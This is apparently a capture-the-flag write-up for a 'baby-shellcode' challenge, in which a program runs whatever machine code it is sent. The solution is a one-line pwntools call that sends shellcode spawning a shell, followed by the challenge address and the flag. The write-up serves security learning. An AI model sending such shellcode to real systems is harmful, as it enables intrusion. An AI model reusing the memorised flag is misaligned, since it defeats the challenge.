# baby-shellcode 
![challenge](challenge.png)
### Challenge:
##### This challenge is a test to see if you know how to write programs that machines can understand.
##### Oh, you know how to code?
##### Write some code into this program, and the program will run it for you.
##### What programming language, you ask? Well... I said it's the language that machines can understand.
##### Author: drec

##### Links: ```nc 34.28.147.7 5000```
##### Files: [baby-shellcode](baby-shellcode)

### Solution:

The challenge asks for shellcode in input and executes it without any restrictions, we can simply send a shellcode that pops a shell

```py
r.sendline(asm(shellcraft.sh()))
```

Solve script: [solve.py](solve.py)

Flag: ```uoftctf{arbitrary_machine_code_execution} ```